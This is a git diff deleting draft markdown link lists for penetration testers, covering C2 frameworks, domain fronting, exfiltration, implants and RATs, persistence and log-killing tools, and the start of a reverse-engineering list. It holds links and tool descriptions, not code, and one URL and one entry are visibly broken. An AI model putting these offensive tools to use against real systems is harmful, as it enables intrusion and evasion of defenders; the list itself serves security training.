-	* [Hacking Corporate Em@il Systems - Nate Power](http://www.irongeek.com/i.php?page=videos/bsidescolumbus2016/offense04-hacking-corporate-emil-systems-nate-power)
-		* In this talk we will discuss current email system attack vectors and how these systems can be abused and leveraged to break into corporate networks. A penetration testing methodology will be discussed and technical demonstrations of attacks will be shown. Phases of this methodology include information gathering, network mapping, vulnerability identification, penetration, privilege escalation, and maintaining access. Methods for organizations to better protect systems will also be discussed.
-
-
---------------
-### <a name="slides"></a>Slides
-Slides
-* [Make It Count: Progressing through Pentesting - Bálint Varga-Perke -Silent Signal](https://silentsignal.hu/docs/Make_It_Count_-_Progressing_through_Pentesting_Balint_Varga-Perke_Silent_Signal.pdf)
-* [Pen Testing a City](https://www.blackhat.com/docs/us-15/materials/us-15-Conti-Pen-Testing-A-City-wp.pdf)
-* [Implanting a Dropcam](https://www.defcon.org/images/defcon-22/dc-22-presentations/Moore-Wardle/DEFCON-22-Colby-Moore-Patrick-Wardle-Synack-DropCam-Updated.pdf)
-
-
-
-
-
---------------
-### <a name="cobalt"></a>Cobalt Strike
-Cobalt Strike
-* Agressor Scripts
-	* [Aggressor Script - cs](https://www.cobaltstrike.com/aggressor-script/index.html)
-	* [CS Aggressor Scripts - ramen0x3f](https://github.com/ramen0x3f/AggressorScripts#utilscna)
-	[aggressor_scripts_collection - invokethreatguy](https://github.com/invokethreatguy/aggressor_scripts_collection)
-		* Collection of various Aggressor Scripts for Cobalt Strike from awesome people. Will be sure to update this repo with credit to each person.
-* C2
-	* [Cobalt Strike External C2 Paper](https://www.cobaltstrike.com/downloads/externalc2spec.pdf)
-	* [External C2 - cs](https://github.com/outflanknl/external_c2)
-		* POC for Cobalt Strike external C2
-	* [Cobalt Strike over external C2 – beacon home in the most obscure ways](https://outflank.nl/blog/2017/09/17/blogpost-cobalt-strike-over-external-c2-beacon-home-in-the-most-obscure-ways/)
-	* [OPSEC Considerations for Beacon Commands - CobaltStrike](https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/)
-	* [Valid SSL Certificates with SSL Beacon - cs](https://www.cobaltstrike.com/help-malleable-c2#validssl)
-	* [Randomized Malleable C2 Profiles Made Easy](https://bluescreenofjeff.com/2017-08-30-randomized-malleable-c2-profiles-made-easy/)
-	* [OPSEC Considerations for beacon commands](https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/)
-* Documentation
-	* [Malleable C2 Documenation - cs](https://www.cobaltstrike.com/help-malleable-c2)
-* Other
-	* [ANGRYPUPPY](https://github.com/vysec/ANGRYPUPPY)
-		* Bloodhound Attack Path Execution for Cobalt Strike
-	* [Modern Defense and You - CS](https://blog.cobaltstrike.com/2017/10/25/modern-defenses-and-you/)
-	* [User Driven Attacks - cs](https://blog.cobaltstrike.com/2014/10/01/user-driven-attacks/)
-	[DDEAutoCS](https://github.com/p292/DDEAutoCS)
-		* A cobaltstrike script that integrates DDEAuto Attacks (launches a staged powershell CS beacon). This is not massively stealthy as far as CS scripts go anything like that at the moment, more of a proof of concept, and for having a play. Customise as you see fit to your needs.
-
-
-
-
-
---------------
-### <a name="cnc"></a>Command & Control
-Command & Control (CnC)
-* [Command & Control: Understanding, Denying and Detecting - 2014 - Joseph Gardiner, Marco Cova, Shishir Nagaraja](https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf)
-* Communication Channel Example PoCs
-	* [Using WebSockets and IE/Edge for C2 communications](https://arno0x0x.wordpress.com/2017/11/10/https://github.com/leoloobeek/GoG reen/blob/master/README.mdusing-websockets-and-ie-edge-for-c2-communications/)
-	* [Spidernet](https://github.com/wandering-nomad/Spidernet)
-		* Proof of Concept of SSH Botnet C&C Using Python 
-	* [twittor - twitter based backdoor](https://github.com/PaulSec/twittor)
-		* A stealthy Python based backdoor that uses Twitter (Direct Messages) as a command and control server This project has been inspired by Gcat which does the same but using a Gmail account.
-	* [Instegogram](https://github.com/endgameinc/instegogram)
-	* [WSC2](https://github.com/Arno0x/WSC2)
-		* WSC2 is a PoC of using the WebSockets and a browser process to serve as a C2 communication channel between an agent, running on the target system, and a controller acting as the actuel C2 server.
-* PoCs
-	* [RemoteRecon](https://github.com/xorrior/RemoteRecon)
-		* RemoteRecon provides the ability to execute post-exploitation capabilities against a remote host, without having to expose your complete toolkit/agent. Often times as operator's we need to compromise a host, just so we can keylog or screenshot (or some other miniscule task) against a person/host of interest. Why should you have to push over beacon, empire, innuendo, meterpreter, or a custom RAT to the target? This increases the footprint that you have in the target environment, exposes functionality in your agent, and most likely your C2 infrastructure. An alternative would be to deploy a secondary agent to targets of interest and collect intelligence. Then store this data for retrieval at your discretion. If these compromised endpoints are discovered by IR teams, you lose those endpoints and the information you've collected, but nothing more.
-	* [Expand Your Horizon Red Team – Modern SaaS C2](https://cybersyndicates.com/2017/04/expand-your-horizon-red-team/)
-	* [JSBN](https://github.com/Plazmaz/JSBN)
-		* JSBN is a bot client which interprets commands through Twitter, requiring no hosting of servers or infected hosts from the command issuer. It is written purely in javascript as a Proof-of-Concept for javascript's botnet potentials.
-	* [Command and Control Using Active Directory](http://www.harmj0y.net/blog/powershell/command-and-control-using-active-directory/)
-	* [PoshC2 v3 with SOCKS Proxy (SharpSocks)](https://labs.nettitude.com/blog/poshc2-v3-with-socks-proxy-sharpsocks/)
-	* [Abusing "Accepted Risk" With 3rd Party C2 - HackMiamiCon5](https://www.slideshare.net/sixdub/abusing-accepted-risk-with-3rd-party-c2-hackmiamicon5)
-	* [MurDock - Mutable Universal Relay Document Kit](https://github.com/themson/MurDocK)
-		* The purpose of this tool is to provide a protocol independent framework that contains a base set of features that can piggyback on top of any collaborative web platform or service. The base docClient and docServer are meant to be extended upon with Buffer classes written for individual web services. These buffer classes can be plugged into the MurDock framework in order to create a unique shell infrastructure that will always contains a base set of features, as well as the ability to tunnel over any web application traffic for which a buffer class has been constructed. The framework can be extended to operate over lower level protocols if desired.
-	[PoshC2](https://github.com/nettitude/PoshC2)
-		* Powershell C2 Server and Implants
-	[FruityC2](https://github.com/xtr4nge/FruityC2)
-		* FruityC2 is a post-exploitation (and open source) framework based on the deployment of agents on compromised machines. Agents are managed from a web interface under the control of an operator.
-	* [PlugBot-C2C](https://github.com/redteamsecurity/PlugBot-C2C)
-		* This is the Command & Control component of the PlugBot project
-	* [How to Build a 404 page not found C2](https://www.blackhillsinfosec.com/?p=5134)
-	* [404 File not found C2 PoC](https://github.com/theG3ist/404)
-	* [Command and Control Using Active Directory](http://www.harmj0y.net/blog/powershell/command-and-control-using-active-directory/)
-	* [C2 with twitter](https://pentestlab.blog/2017/09/26/command-and-control-twitter/)
-	* [C2 with DNS](https://pentestlab.blog/2017/09/06/command-and-control-dns/)
-	* [ICMP C2](https://pentestlab.blog/2017/07/28/command-and-control-icmp/)
-	* [C2 with Dropbox](https://pentestlab.blog/2017/08/29/command-and-control-dropbox/)
-	* [C2 with https](https://pentestlab.blog/2017/10/04/command-and-control-https/)
-	* [C2 with webdav](https://pentestlab.blog/2017/09/12/command-and-control-webdav/)
-	* [C2 with gmail](https://pentestlab.blog/2017/08/03/command-and-control-gmail/)
-	* [“Tasking” Office 365 for Cobalt Strike C2](https://labs.mwrinfosecurity.com/blog/tasking-office-365-for-cobalt-strike-c2/)
-	* [Simple domain fronting PoC with GAE C2 server](https://www.securityartwork.es/2017/01/31/simple-domain-fronting-poc-with-gae-c2-server/)
-	* [Using WebDAV features as a covert channel](https://arno0x0x.wordpress.com/2017/09/07/using-webdav-features-as-a-covert-channel/)
-
-
-
-
-
-### <a name="front"></a>Domains
-* Domain Fronting
-	* [FindFrontableDomains](https://github.com/rvrsh3ll/FindFrontableDomains)
-		* Search for potential frontable domains
-	* [High-reputation Redirectors and Domain Fronting](https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/)
-	* [Blocking-resistant communication through domain fronting](https://www.bamsoftware.com/talks/fronting-pets2015/)
-	* [Camouflage at encryption layer: domain fronting](https://www.securityartwork.es/2017/01/24/camouflage-at-encryption-layer-domain-fronting/)
-	* [Domain Fronting - Infosec Institute](http://resources.infosecinstitute.com/domain-fronting/)
-	* [Simple domain fronting PoC with GAE C2 server](https://www.securityartwork.es/2017/01/31/simple-domain-fronting-poc-with-gae-c2-server/)
-		* In this entry we continue with domain fronting; on this occasion we will explore how to implement a simple PoC of a command and control and exfiltration server on Google App Engine (GAE), and we will see how to do the domain fronting from Windows, with a VBS or PowerShell script, to hide interactions with the C2 server.
-	* [TOR Fronting – Utilising Hidden Services for Privacy](https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/)
-	* [Finding Domain frontable Azure domains - thoth / Fionnbharr (@a_profligate)](https://theobsidiantower.com/2017/07/24/d0a7cfceedc42bdf3a36f2926bd52863ef28befc.html)
-	* [Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike](https://www.cyberark.com/threat-research-blog/red-team-insights-https-domain-fronting-google-hosts-using-cobalt-strike/)
-	* [Domain Fronting Via Cloudfront Alternate Domains](https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/)
-* Domain Tools
-	* [Domain Hunter](https://github.com/minisllc/domainhunter)
-		* Checks expired domains, bluecoat categorization, and Archive.org history to determine good candidates for phishing and C2 domain names
-	* [AIRMASTER](https://github.com/t94j0/AIRMASTER)
-		* Use ExpiredDomains.net and BlueCoat to find useful domains for red team.
-	* [Chameleon](https://github.com/mdsecactivebreach/Chameleon)
-		* A tool for evading Proxy categorisation
-	* [CatMyFish](https://github.com/Mr-Un1k0d3r/CatMyFish)
-		* Search for categorized domain that can be used during red teaming engagement. Perfect to setup whitelisted domain for your Cobalt Strike beacon C&C.  It relies on expireddomains.net to obtain a list of expired domains. The domain availability is validated using checkdomain.com
-	* [Finding Frontable Domain](https://github.com/rvrsh3ll/FindFrontableDomains)
-* Domain Reputation Sites
-	* [Alien Vault](http://www.alienvault.com)
-	* [Isithacked?](http://www.isithacked.com)
-	* [Robtex](https://dns.robtex.com)
-	* [Scan4You](http://scan4you.net/)
-	* [Sucuri](http://sitecheck.sucuri.net/scanner/)
-	* [Trustedsource](http://www.trustedsource.org/)
-	* [urlQuery](http://urlquery.net/search.php)
-	* [URLVoid](http://www.urlvoid.com/scan/)
-	* [VirusTotal](https://www.virustotal.com/)
-	* [WOT](http://www.mywot.com/en/scorecard)
-	* [Zeltser BL](http://zeltser.com)
-* Redirectors
-	* [Apache2Mod Rewrite Setup](https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup)
-	* [Redirecting Cobalt Strike DNS Beacons](http://www.rvrsh3ll.net/blog/offensive/redirecting-cobalt-strike-dns-beacons/)
-	* [High-reputation Redirectors and Domain Fronting](https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/)
-	* [Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite - Jeff Dimmock](https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/)
-
-
-
-
-
-
-
-
-### <a name="egress"></a>Egress/Exfiltration
-Egress & Exfiltration
-* Articles
-	* [Practical Comprehensive Bounds on Surreptitious Communication Over DNS](http://www.icir.org/vern/papers/covert-dns-usec13.pdf)
-	* [Exfiltration by encoding data in pixel colour values](https://www.pentestpartners.com/security-blog/exfiltration-by-encoding-data-in-pixel-colour-values/)
-	* [Data Sound Modulation POC](https://github.com/iiamit/data-sound-poc)
-	* [Hiding Malicious Traffic Under the HTTP 404 Error](https://blog.fortinet.com/2015/04/09/hiding-malicious-traffic-under-the-http-404-error)
-	* [Covert Channels in TCP/IP Protocol Stack - extended version-](https://eprints.ugd.edu.mk/10284/1/surveyAMBPselfArc.pdf)
-	* [A Survey of Covert Channels and Countermeasures in Computer Network Protocols](http://caia.swin.edu.au/cv/szander/publications/szander-ieee-comst07.pdf)
-		* Covert channels are used for the secret transfer of information. Encryption only protects communication from being decoded by unauthorised parties, whereas covert channels aim to hide the very existence of the communication. Initially, covert channels were identified as a security threat on monolithic systems i.e. mainframes. More recently focus has shifted towards covert channels in computer network protocols. The huge amount of data and vast number of different protocols in the Internet seems ideal as a high-bandwidth vehicle for covert communication. This article is a survey of the existing techniques for creating covert channels in widely deployed network and application protocols. We also give an overview of common methods for their detection, elimination, and capacity limitation, required to improve security in future computer networks.
-	* [Covert Timing Channels Based on HTTP Cache Headers - Video Presentation](https://www.youtube.com/watch?v=DOAG3mtz7H4)
-	* [Covert Timing Channels Based on HTTP Cache Headers - Paper](https://scholarworks.rit.edu/cgi/viewcontent.cgi?filename=0&article=1784&context=other&type=additional)
-	* [Blocking-resistant communication through domain fronting](https://www.bamsoftware.com/papers/fronting/)
-	* [Egressing Bluecoat with CobaltStike & Let's Encrypt](https://cybersyndicates.com/2016/12/egressing-bluecoat-with-cobaltstike-letsencrypt/)
-	* [Project Loki - Phrack 7-49](http://phrack.org/issues/49/6.html)
-		* This whitepaper is intended as a complete description of the covert channel that exists in networks that allow ping traffic (hereon referred to in the more general sense of ICMP_ECHO traffic --see below) to pass.
-	* [Escape and Evasion Egressing Restricted Networks - Tom Steele and Chris Patten](https://www.optiv.com/blog/escape-and-evasion-egressing-restricted-networks)
-* Talks
-	* [DIY Spy Covert Channels With Scapy And Python - Jen Allen - ANYCON 2017](http://www.irongeek.com/i.php?page=videos/anycon2017/diy-spy-covert-channels-with-scapy-and-python-jen-allen)
-	* [Goodbye Data, Hello Exfiltration - Itzik Kotler](https://www.youtube.com/watch?v=GwaIvm2HJKc)
-		* Penetration testing isn’t about getting in, it’s also about getting out with the goodies. In this talk, you will learn how leverage commonly installed software (not Kali Linux!) to exfiltrate data from networks. Moving on to more advanced methods that combines encryption, obfuscation, splitting (and Python). Last but not least, I’ll address data exfiltration via physical ports and demo one out-of-the-box method to do it.
-		* [Slides](http://www.ikotler.org/GoodbyeDataHelloExfiltration_BSidesORL.pdf)
-	* [Itzik Kotler | Goodbye Data, Hello Exfiltration - BSides Orlando](https://www.youtube.com/watch?v=GwaIvm2HJKc)
-		* Penetration testing isn’t about getting in, it’s also about getting out with the goodies. In this talk, you will learn how leverage commonly installed software (not Kali Linux!) to exfiltrate data from networks. Moving on to more advanced methods that combines encryption, obfuscation, splitting (and Python). Last but not least, I’ll address data exfiltration via physical ports and demo one out-of-the-box method to do it.
-	* [In Plain Sight: The Perfect Exfiltration Technique - Itzik Kotler and Amit Klein - HiTB2016](https://www.youtube.com/watch?v=T6PscV43C0w)
-		* In this session, we will reveal and demonstrate perfect exfiltration via indirect covert channels (i.e. the communicating parties don’t directly exchange network packets). This is a family of techniques to exfiltrate data (low throughput) from an enterprise in a manner indistinguishable from genuine traffic. Using HTTP and exploiting a byproduct of how some websites choose to cache their pages, we will demonstrate how data can be leaked without raising any suspicion. These techniques are designed to overcome even perfect knowledge and analysis of the enterprise network traffic.
-	* [How To Bypass Email Gateways Using Common Payloads by Neil Lines - BSides Manchester2017](https://www.youtube.com/watch?v=eZxWDCetqkE&index=11&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP)
-* Tools
-	* [PTP-RAT](https://github.com/pentestpartners/PTP-RAT)
-		* Exfiltrate data over screen interfaces
-	
-
---------------
-### Empire
-Empire
-* Articles
-	* [Hunting Red Team Empire C2 Infrastructure](http://www.chokepoint.net/2017/04/hunting-red-team-empire-c2.html)
-	* [Athena: The CIA’s RAT vs Empire](https://bneg.io/2017/05/22/athena-the-cias-rat-vs-empire/)
-* Customizing
-	* [Using PowerShell Empire with a Trusted Certificate](https://www.blackhillsinfosec.com/using-powershell-empire-with-a-trusted-certificate/)
-	* [How to Make Empire Communication profiles - bluescreenofjeff](https://github.com/bluscreenofjeff/bluscreenofjeff.github.io/blob/master/_posts/2017-03-01-how-to-make-communication-profiles-for-empire.md)
-	* [Empire – Modifying Server C2 Indicators](http://threatexpress.com/2017/05/empire-modifying-server-c2-indicators/)
-	* [Empire Domain Fronting](https://www.xorrior.com/Empire-Domain-Fronting/)
-	* [Empire without powershell](https://bneg.io/2017/07/26/empire-without-powershell-exe/)
-
-
-
-
-
---------------
-##### <a name="hw"></a>HW
-* [DigiDucky - How to setup a Digispark like a rubber ducky](http://www.redteamr.com/2016/08/digiducky/)
-* [Bash Bunny](https://hakshop.com/products/bash-bunny)
-* [How to Build Your Own Penetration Testing Drop Box - BHIS](https://www.blackhillsinfosec.com/?p=5156&)
-* [P4wnP1](https://github.com/mame82/P4wnP1)
-	* P4wnP1 is a highly customizable USB attack platform, based on a low cost Raspberry Pi Zero or Raspberry Pi Zero W.
-	* [Contents of a Physical Pentester Backpack](https://www.tunnelsup.com/contents-of-a-physical-pen-testers-backpack/)
-
-
-
---------------
-### Implants
-* [CheckPlease](https://github.com/Arvanaghi/CheckPlease)
-	* Implant-Security modules written in PowerShell, Python, Go, Ruby, C, C#, Perl, and Rust. 
-* [ThunderShell](https://github.com/Mr-Un1k0d3r/ThunderShell)
-	* ThunderShell is a Powershell based RAT that rely on HTTP request to communicate. All the network traffic is encrypted using a second layer of RC4 to avoid SSL interception and defeat network hooks.
-* [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell)
-	* A Powershell client for dnscat2, an encrypted DNS command and control tool
-* [WMImplant](https://github.com/ChrisTruncer/WMImplant)
-	* WMImplant is a PowerShell based tool that leverages WMI to both perform actions against targeted machines, but also as the C2 channel for issuing commands and receiving results. WMImplant will likely require local administrator permissions on the targeted machine.
-* [DNS-Persist](https://github.com/0x09AL/DNS-Persist)
-	* DNS-Persist is a post-exploitation agent which uses DNS for command and control. The server-side code is in Python and the agent is coded in C++.
-* [BrainDamage](https://github.com/mehulj94/BrainDamage)
-	* A fully featured backdoor that uses Telegram as a C&C server
-* [Inside a low budget
-
-
-
---------------
-### Infrastructure
-Infrastructure
-* General	
-	* [How to Build a C2 Infrastructure with Digital Ocean – Part 1](https://www.blackhillsinfosec.com/build-c2-infrastructure-digital-ocean-part-1/)
-	* [Infrastructure for Ongoing Red Team Operations](https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/)
-	* [Automated Red Team Infrastructure Deployment with Terraform - Part 1](https://rastamouse.me/2017/08/automated-red-team-infrastructure-deployment-with-terraform---part-1/)
-	* [6 RED TEAM INFRASTRUCTURE TIPS](https://cybersyndicates.com/2016/11/top-red-team-tips/)
-	* [Migrating Your infrastructure](https://blog.cobaltstrike.com/2015/10/21/migrating-your-infrastructure/)
-* Logging
-	* [Attack Infrastructure Log Aggregation and Monitoring](https://posts.specterops.io/attack-infrastructure-log-aggregation-and-monitoring-345e4173044e)
-
-
-
-------------------
-### Payloads
-* [Malice](https://github.com/maliceio/malice)
-	* Malice's mission is to be a free open source version of VirusTotal that anyone can use at any scale from an independent researcher to a fortune 500 company.
-* [Pupy](https://github.com/n1nj4sec/pupy)
-	* Pupy is an opensource, multi-platform Remote Administration Tool with an embedded Python interpreter. Pupy can load python packages from memory and transparently access remote python objects. Pupy can communicate using different transports and have a bunch of cool features & modules. On Windows, Pupy is a reflective DLL and leaves no traces on disk.
-* [RedSails](https://github.com/BeetleChunks/redsails)
-	* Python based post-exploitation project aimed at bypassing host based security monitoring and logging. [DerbyCon 2017 Talk](https://www.youtube.com/watch?v=Ul8uPvlOsug)
-* [stupid_malware](https://github.com/andrew-morris/stupid_malware)
-	* Python malware for pentesters that bypasses most antivirus (signature and heuristics) and IPS using sheer stupidity
-* [Dragon: A Windows, non-binding, passive download / exec backdoor](http://www.shellntel.com/blog/2015/6/11/dragon-a-windows-non-binding-passive-downloadexec-backdoor)
-* [MetaTwin](https://github.com/minisllc/metatwin)
-		* The project is designed as a file resource cloner. Metadata, including digital signature, is extracted from one file and injected into another. Note: Signatures are copied, but no longer valid.
-		* [Blogpost](http://threatexpress.com/2017/10/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/)
-
-
-
-### <a name="persistence"></a>Persistence
-Persistence Methods
-* [Staying Persistent in Software Defined Networks](https://www.blackhat.com/docs/us-15/materials/us-15-Pickett-Staying-Persistent-In-Software-Defined-Networks-wp.pdf)
-* [Phant0m: Killing Windows Event Log Phant0m: Killing Windows Event Log](https://artofpwn.com/phant0m-killing-windows-event-log.html)
-* [Invoke-Phant0m](https://github.com/hlldz/Invoke-Phant0m)
-	* This script walks thread stacks of Event Log Service process (spesific svchost.exe) and identify Event Log Threads to kill Event Log Service Threads. So the system will not be able to collect logs and at the same time the Event Log Service will appear to be running.
-
-
-
-
---------------
-### Tactics
-Tactics
-* Ideas
-	* [unindexed](https://github.com/mroth/unindexed/blob/master/README.md)
-		* The site is constantly searching for itself in Google, over and over and over, 24 hours a day. The instant it finds itself in Google search results, the site will instantaneously and irrevocably securely delete itself. Visitors can contribute to the public content of the site, these contributions will also be destroyed when the site deletes itself.
-	* [Hiding your process from sysinternals](https://riscybusiness.wordpress.com/2017/10/07/hiding-your-process-from-sysinternals/)
-* Keying Payloads
-	* [Keying Payloads for Scripting Languages](https://adapt-and-attack.com/2017/11/15/keying-payloads-for-scripting-languages/)
-	* [GoGreen](https://github.com/leoloobeek/GoGreen/blob/master/README.md)
-		* This project was created to bring environmental (and HTTP) keying to scripting languages. As its common place to use PowerShell/JScript/VBScript as an initial vector of code execution, as a result of phishing or lateral movement, I see value of the techniques for these languages.
-* Lateral Movement
-	* WMI
-		* [Abusing Windows Management Instrumentation (WMI) to Build a Persistent, Asyncronous, and Fileless Backdoor](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf)
-	* [Creeping on Users with WMI Events: Introducing PowerLurk](https://pentestarmoury.com/2016/07/13/151/)
-	* [PowerLurk](https://github.com/Sw4mpf0x/PowerLurk)
-		* PowerLurk is a PowerShell toolset for building malicious WMI Event Subsriptions. The goal is to make WMI events easier to fire off during a penetration test or red team engagement.
-	* [Windows Security Center: Fooling WMI Consumers](https://www.opswat.com/blog/windows-security-center-fooling-wmi-consumers)
-	* [CimSweep](https://github.com/PowerShellMafia/CimSweep)
-		* CimSweep is a suite of CIM/WMI-based tools that enable the ability to perform incident response and hunting operations remotely across all versions of Windows. CimSweep may also be used to engage in offensive reconnaisance without the need to drop any payload to disk. Windows Management Instrumentation has been installed and its respective service running by default since Windows XP and Windows 2000 and is fully supported in the latest versions of Windows including Windows 10, Nano Server, and Server 2016.
-* Simulation
-	* [DumpsterFire](https://github.com/TryCatchHCF/DumpsterFire)
-		* [Slides](https://github.com/TryCatchHCF/DumpsterFire/raw/master/CactusCon_2017_Presentation/DumpsterFire_CactusCon_2017_Slides.pdf)
-		* The DumpsterFire Toolset is a modular, menu-driven, cross-platform tool for building repeatable, time-delayed, distributed security events. Easily create custom event chains for Blue Team drills and sensor / alert mapping. Red Teams can create decoy incidents, distractions, and lures to support and scale their operations. Turn paper tabletop exercises into controlled "live fire" range events. Build event sequences ("narratives") to simulate realistic scenarios and generate corresponding network and filesystem artifacts.
-
-
-
-#### Code Injection
-[injectAllTheThings](https://github.com/fdiskyou/injectAllTheThings/)
-* Single Visual Studio project implementing multiple DLL injection techniques (actually 7 different techniques) that work both for 32 and 64 bits. Each technique has its own source code file to make it easy way to read and understand.
-
-[Inject All the Things - Shut up and hack](http://blog.deniable.org/blog/2017/07/16/inject-all-the-things/)
-
-
-
---------------
-### Pen Testing X
-
-#### AIX
-* [AIX for Penetration Testers 2017 thevivi.net](https://thevivi.net/2017/03/19/aix-for-penetration-testers/)
-* [Hunting Bugs in AIX : Pentesting writeup](https://rhinosecuritylabs.com/2016/11/03/unix-nostalgia-hunting-zeroday-vulnerabilities-ibm-aix/)
-* [Penetration Testing Trends John Strand - Derbycon6](https://www.youtube.com/watch?v=QyxdUe1iMNk)
-
-
-
-Embedded
-	* [War Stories on Embedded Security Pentesting IoT Building Managers and how to do Better Dr Jared - Derbycon7](https://www.youtube.com/watch?v=bnTWysHT0I4&index=8&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
-
-SCADA/PLCs
-* [Industrial Control Systems : Pentesting PLCs 101 (Part 1/2)](https://www.youtube.com/watch?v=iGwm6-lyn2Y)
-* [Industrial Control Systems : Pentesting PLCs 101 (Part 2/2)](https://www.youtube.com/watch?v=rP_Jys1_OJk)
-* [Adventures in Attacking Wind Farm Control Networks - Jason Stagg](https://www.blackhat.com/docs/us-17/wednesday/us-17-Staggs-Adventures-In-Attacking-Wind-Farm-Control-Networks.pdf)
-* [Protocol Me Maybe? How to Date SCADA - Stephen Hilt](http://www.irongeek.com/i.php?page=videos/derbycon4/t124-protocol-me-maybe-how-to-date-scada-stephen-hilt)
-
-MainFrames
-* [Hacking Mainframes; Vulnerabilities in applications exposed over TN3270 - Dominic White](http://www.irongeek.com/i.php?page=videos/derbycon4/t217-hacking-mainframes-vulnerabilities-in-applications-exposed-over-tn3270-dominic-white)
-	* IBM System Z Mainframes are in regular use in Fortune 500 companies. Far from being legacy these systems are running an actively maintained operating system (z/OS). Applications on these often occupy roles critical to the business processes they underpin, with much of the later technology built around them, rather than replacing them. However, these systems are often bypassed by security testing due to worried of availability or assumptions about legacy. This talk will introduce you to assessing mainframe applications, which turn out to be quite similar to web applications. For this purpose we built a tool, Big Iron Recon & Pwnage (BIRP), to assist with performing such assessments. Importantly, our research uncovered a family of mainframe application vulnerabilities introduced by the TN3270 protocol. We found numerous applications, but not all, vulnerable to these flaws. Applications running within the two most popular transaction managers (CICS and IMS) as well as one of IBM’s own applications. The tool released assists with the exploitation of these flaws.
\ No newline at end of file
diff --git a/Draft/Reverse Engineering.md b/Draft/Reverse Engineering.md
deleted file mode 100755
index a593049..0000000
--- a/Draft/Reverse Engineering.md	
+++ /dev/null
@@ -1,529 +0,0 @@
-
-
-# Reverse Engineering
-
-ToC
-* [Frameworks](#frameworks)
-* [Debuggers & Related Techniques](#dbg)
-* [Decompilers](#decom)
-* [Comparison Tools](#ct)
-* [Tools](#tools)
-	..* [Linux Specific Tools](#lt)
-	..* [Windows Specific Tools](#wt)
-	..* [Programming Libraries](#pl)
-* [Anti-Reverse Engineering & Countermeasure](#ar)
-* [Guides & Tutorials](#guides)
-* [Hardware Reverse Engineering](#hre)
-* [Protocol Analysis](#pa)
-* [Write-ups](#writeups)
-* [Talks & Videos](#talks)
-* [Papers](#papers)
-* [Wikis & Useful Sites](#wikis)
-
-
-
-
-
-### To be sorted
-* To Add
-	* A proper ToC
-* [Bytecode Club - RE Forum](https://the.bytecode.club/)
-* [Blackbone](https://github.com/DarthTon/Blackbone)
-	* Windows memory hacking library
-* [Cryptoshark](https://github.com/frida/cryptoshark)
-	* Interactive code tracer for reverse-engineering proprietary software 
-#### End sort
-
-
-
-
-
---------------
-### General
-General
-* Articles
-	* [Reverse Engineering - Wikipedia](https://en.wikipedia.org/wiki/Reverse_engineering)
-	* [High Level view of what Reverse Engineering is](http://www.program-transformation.org/Transform/DecompilationAndReverseEngineering)
-	* [What is Reverse Engineering?](http://www.program-transformation.org/Transform/DecompilationAndReverseEngineering)
-* Educational
-	* [Introduction to Reverse Engineering Software - Dartmouth](http://althing.cs.dartmouth.edu/local/www.acm.uiuc.edu/sigmil/RevEng/)
-	* [CSCI 4974 / 6974 Hardware Reverse Engineering](http://security.cs.rpi.edu/courses/hwre-spring2014/)
-	* [Starting from Scratch?](http://www.reddit.com/r/ReverseEngineering/comments/smf4u/reverser_wanting_to_develop_mathematically/)
-	* [Introduction to Reverse Engineering Software](http://althing.cs.dartmouth.edu/local/www.acm.uiuc.edu/sigmil/RevEng/)
-		* This book is an attempt to provide an introduction to reverse engineering software under both Linux and Microsoft Windows©. Since reverse engineering is under legal fire, the authors figure the best response is to make the knowledge widespread. The idea is that since discussing specific reverse engineering feats is now illegal in many cases, we should then discuss general approaches, so that it is within every motivated user's ability to obtain information locked inside the black box. Furthermore, interoperability issues with closed-source proprietary systems are just plain annoying, and something needs to be done to educate more open source developers as to how to implement this functionality in their software. 
-	* [Reverse History Part Two – Research](http://jakob.engbloms.se/archives/1554)
-	* [mammon_'s tales to his grandson](https://mammon.github.io/tales/)
-	* [Reversing Prince Harming’s Kiss of Death]( https://reverse.put.as/2015/07/01/reversing-prince-harmings-kiss-of-death/)
-	* [Theorem prover, symbolic execution and practical reverse-engineering](https://doar-e.github.io/presentations/securityday2015/SecDay-Lille-2015-Axel-0vercl0k-Souchet.html#/)
-* Timelines
-	* [Symbolic execution timeline](https://github.com/enzet/symbolic-execution)
-		* Diagram highlights some major tools and ideas of pure symbolic execution, dynamic symbolic execution (concolic) as well as related ideas of model checking, SAT/SMT solving, black-box fuzzing, taint data tracking, and other dynamic analysis techniques.
-* Videos
-	* [The Best Campfire Tales that Reverse Engineers Tell - Travis Goodspeed with Sergey Bratus](https://www.youtube.com/watch?v=l39OVRDvN9w)
-	* [Jailbreaks and Pirate Tractors: Reverse Engineering Do’s and Don’ts](https://www.youtube.com/watch?v=8_mMTVsOM6Y)
-	* [Introduction to Reversing and Pwning - David Weinman - BsidesLV ProvingGrounds17](https://www.youtube.com/watch?v=4rjWlOvbz7U&app=desktop)
-	
-
-	
-
---------------
-### Things that are interesting/don't fit elsewhere
-Things that Don't fit elsewhere
-* Code Tools
-	* [SyntaxHighlighter](http://alexgorbatchev.com/SyntaxHighlighter/)
-		* SyntaxHighlighter is a fully functional self-contained code syntax highlighter developed in JavaScript. To get an idea of what SyntaxHighlighter is capable of, have a look at the demo page.
-	* [linguist](https://github.com/github/linguist)
-		* Language Savant. If your repository's language is being reported incorrectly, send us a pull request!
-	* [Ohcount - Ohloh's source code line counter.](https://github.com/blackducksoftware/ohcount)
